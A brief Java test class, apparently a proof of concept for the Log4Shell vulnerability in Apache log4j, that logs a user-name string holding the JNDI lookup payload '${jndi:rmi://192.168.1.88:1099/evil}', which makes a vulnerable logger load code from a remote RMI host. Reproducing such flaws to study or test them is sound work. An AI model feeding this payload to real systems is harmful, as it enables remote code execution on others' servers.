package log4j.security.hole.test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Test {
    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
//        String username ="${java:vm}";
        String username ="${jndi:rmi://192.168.1.88:1099/evil}";
        System.out.println("test");
        logger.error("Hello, {}!",username);
    }
}
